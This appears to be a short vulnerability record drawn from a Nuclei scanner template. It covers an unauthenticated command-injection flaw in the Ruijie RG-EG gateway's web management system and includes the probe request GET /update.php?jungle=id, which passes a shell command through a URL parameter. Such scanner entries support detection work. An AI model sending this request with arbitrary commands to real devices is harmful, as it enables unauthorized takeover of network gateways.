# Vulnerability: Ruijie RG-EG - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`ruijie-rg-eg-web-mis-rce.yaml`)

## Description
Ruijie RG-EG easy gateway WEB management system front-end RCE has a command execution vulnerability. An attacker without identity authentication can execute arbitrary commands to control server permissions.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/update.php?jungle=id
```

